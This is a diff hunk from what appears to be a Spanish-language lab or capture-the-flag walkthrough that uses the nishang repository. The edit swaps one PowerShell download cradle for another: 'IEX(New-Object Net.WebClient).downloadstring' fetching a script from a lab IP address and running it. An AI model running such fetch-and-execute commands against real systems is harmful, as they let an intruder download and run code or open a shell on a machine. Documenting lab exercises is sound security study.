@@ -315,7 +315,7 @@ vamos a utilizar el repositorio de [nishang](https://github.com/samratashok/nish
 llamamos el archivo desde la web con el siguiente comando
 
 ```python
-IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.64/SharpHound.ps1')
+powershell IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.73:9006/')
 ```
 
 ![[Pasted image 20240724154838.png]]
